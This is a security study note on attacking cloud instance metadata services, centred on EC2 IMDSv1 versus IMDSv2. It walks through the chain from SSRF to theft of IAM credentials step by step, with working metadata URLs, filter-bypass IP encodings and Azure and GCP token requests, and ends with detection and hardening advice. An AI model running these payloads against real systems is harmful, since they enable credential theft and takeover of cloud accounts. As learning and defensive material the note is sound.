# 01.3 — Metadata Service Attacks (IMDSv1 vs IMDSv2)

## What This Note Covers

The EC2 Instance Metadata Service (IMDS) is one of the highest-impact attack vectors in AWS. This note covers what it is, why IMDSv1 is critical, how to exploit SSRF to steal IAM credentials via the metadata service, and the full exploitation chain from SSRF to account compromise.

---

## What Is the EC2 Instance Metadata Service?

Every EC2 instance can query a special HTTP endpoint at `http://169.254.169.254` to retrieve information about itself. This is how applications running on EC2 discover their own:
- Instance ID, AMI ID, region, availability zone
- Hostname and IP addresses
- IAM role name and **temporary credentials**
- User data (the startup script)
- Security groups and network interfaces

The address `169.254.169.254` is a **link-local address** — it's only accessible from within the EC2 instance itself. It is not routable over the internet.

**Until SSRF happens.**

---

## IMDSv1 — The Vulnerable Version

IMDSv1 (Instance Metadata Service version 1) requires **no authentication**. Any HTTP GET request from within the instance to `169.254.169.254` is served immediately, no questions asked.

This means:
- If any application running on that instance has an SSRF vulnerability, an attacker can use it to reach the metadata service
- The attacker gets the temporary IAM credentials of the instance's attached role
- With those credentials, the attacker can act as that role anywhere in AWS

### Checking if IMDSv1 Is Enabled

```bash
# From within the instance or via SSRF:
curl http://169.254.169.254/latest/meta-data/

# If it responds without requiring a token → IMDSv1 is enabled (vulnerable)
# Response will be a list of metadata categories

# From outside (via AWS API — requires ec2:DescribeInstances):
aws ec2 describe-instances \
  --instance-ids i-0abc123456 \
  --query 'Reservations[].Instances[].MetadataOptions'
# Look for: "HttpTokens": "optional" → IMDSv1 enabled
# Look for: "HttpTokens": "required" → IMDSv2 only (safe)
```

---

## IMDSv2 — The Mitigated Version

IMDSv2 requires a **session token** that must be obtained first via a PUT request before any metadata can be read. The PUT request cannot be made via SSRF in typical configurations because:
- It requires a `X-aws-ec2-metadata-token-ttl-seconds` header
- Many SSRF vulnerabilities only allow GET requests
- Proxies typically strip custom headers

```bash
# IMDSv2: get a session token first
TOKEN=$(curl -X PUT \
  "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Then use the token in subsequent requests
curl http://169.254.169.254/latest/meta-data/ \
  -H "X-aws-ec2-metadata-token: $TOKEN"
```

> [!tip] IMDSv2 isn't a complete fix
> If the SSRF can make PUT requests with custom headers (some can), IMDSv2 is still bypassable. IMDSv2 raises the bar significantly but isn't bulletproof.

## Full Exploitation Chain: SSRF → IAM Credentials

### Scenario
Target: A web application running on EC2 that has an SSRF vulnerability (e.g., a URL fetching feature, a PDF generator, an image proxy).

The EC2 instance has an IAM instance profile attached with the role `AppServerRole`.

### Step 1: Identify SSRF

The application has a parameter that fetches a URL:
```
GET /fetch?url=https://example.com/image.jpg
```

Test if internal URLs are accessible:
```
GET /fetch?url=http://169.254.169.254/latest/meta-data/
```

If the response contains metadata categories (`ami-id`, `hostname`, etc.) → SSRF confirmed, IMDSv1 enabled.

### Step 2: Get the IAM Role Name

```
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Response: `AppServerRole`

### Step 3: Get the Temporary Credentials

```
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AppServerRole
```

Response:
```json
{
  "Code": "Success",
  "LastUpdated": "2024-01-01T10:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA1234567890EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoXnyc4lcK4w4OIaYnuFgZD4NVv3BkkI0q8F7WhnoIlAxZYeoaMatA...",
  "Expiration": "2024-01-01T16:00:00Z"
}
```

### Step 4: Use the Credentials

```bash
export AWS_ACCESS_KEY_ID=ASIA1234567890EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_SESSION_TOKEN=AQoXnyc4lcK4w4OIaYnuFgZD4NVv3BkkI0q8F7WhnoIlAxZYeoaMatA...

# Validate
aws sts get-caller-identity
# Returns the AppServerRole identity

# Enumerate what AppServerRole can do
python3 enumerate-iam.py \
  --access-key $AWS_ACCESS_KEY_ID \
  --secret-key $AWS_SECRET_ACCESS_KEY \
  --session-token $AWS_SESSION_TOKEN

# If the role has broad permissions, you now control the AWS environment
```

## Other Valuable Metadata Endpoints

Beyond credentials, the metadata service exposes other useful information:

```bash
# Base URL (all available categories)
curl http://169.254.169.254/latest/meta-data/

# Instance ID
curl http://169.254.169.254/latest/meta-data/instance-id

# Public IP address
curl http://169.254.169.254/latest/meta-data/public-ipv4

# Local hostname
curl http://169.254.169.254/latest/meta-data/hostname

# Security groups
curl http://169.254.169.254/latest/meta-data/security-groups

# User data (startup script — often contains credentials/config)
curl http://169.254.169.254/latest/user-data

# IAM info (the attached role)
curl http://169.254.169.254/latest/meta-data/iam/info

# AMI ID (can be used to find the same image and extract secrets from it)
curl http://169.254.169.254/latest/meta-data/ami-id

# Network interfaces
curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/
```

> [!warning] User data is a treasure chest
> The EC2 user data (startup script) is often where admins put database passwords, API keys, bootstrap credentials, and configuration. Always retrieve and examine it.

---

## SSRF Bypasses for Metadata Endpoint

Some applications have SSRF protections that block `169.254.169.254` directly. Common bypass techniques:

```bash
# IPv6 representation of the link-local address
http://[::ffff:169.254.169.254]/latest/meta-data/

# Decimal IP notation
http://2852039166/latest/meta-data/

# Octal IP notation
http://0251.0376.0251.0376/latest/meta-data/

# Short URL / redirect (if the SSRF follows redirects)
# Use a URL shortener that redirects to 169.254.169.254

# DNS rebinding (advanced)
# Register a domain that resolves to 169.254.169.254

# AWS-specific: http://169.254.169.254 has a public DNS alias
# http://instance-data/ (works inside EC2)
# http://169.254.169.254/ also reachable as:
# http://metadata.internal/ (varies by AMI)
```

## Other Cloud Metadata Endpoints

The same SSRF-to-metadata pattern applies to Azure and GCP:

```bash
# Azure IMDS
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Azure: get managed identity token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# GCP IMDS (requires header — harder to exploit via simple SSRF)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/"

# GCP: get service account token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# GCP: get project ID
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/project-id"
```

> [!tip] GCP metadata is harder to SSRF
> The `Metadata-Flavor: Google` header requirement means simple SSRF often can't reach it. But if you can control headers or use a blind SSRF that reflects responses, it's still exploitable.

## Detection and Defences

### What This Looks Like in CloudTrail

```json
// AssumeRole via instance profile shows in CloudTrail as:
{
  "eventSource": "sts.amazonaws.com",
  "eventName": "AssumeRole",
  "userAgent": "aws-internal/3",
  "requestParameters": {
    "roleArn": "arn:aws:iam::123456789012:role/AppServerRole"
  }
}

// Suspicious indicators:
// - Same role credentials used from a different IP than the instance
// - AssumeRole from an unexpected source
// - Credentials used after instance termination
```

### Defences

1. **Enforce IMDSv2** — set `HttpTokens: required` on all instances
2. **Disable IMDS entirely** if the application doesn't need it
3. **Restrict EC2 instance roles** — minimum permissions required for the application
4. **WAF rules** — block HTTP responses containing metadata patterns
5. **Fix SSRF** in the application — validate and allowlist URLs

```bash
# Enforce IMDSv2 on an existing instance
aws ec2 modify-instance-metadata-options \
  --instance-id i-0abc123456 \
  --http-tokens required \
  --http-put-response-hop-limit 1

# Enforce IMDSv2 at account level via SCP or config rule
# AWS Config rule: ec2-imdsv2-check
```

## Quick Reference — Metadata Exploitation

```bash
# Check if IMDSv1 is accessible (from inside instance or via SSRF)
curl http://169.254.169.254/latest/meta-data/

# Get role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Get user data (startup script)
curl http://169.254.169.254/latest/user-data

# Set stolen credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```
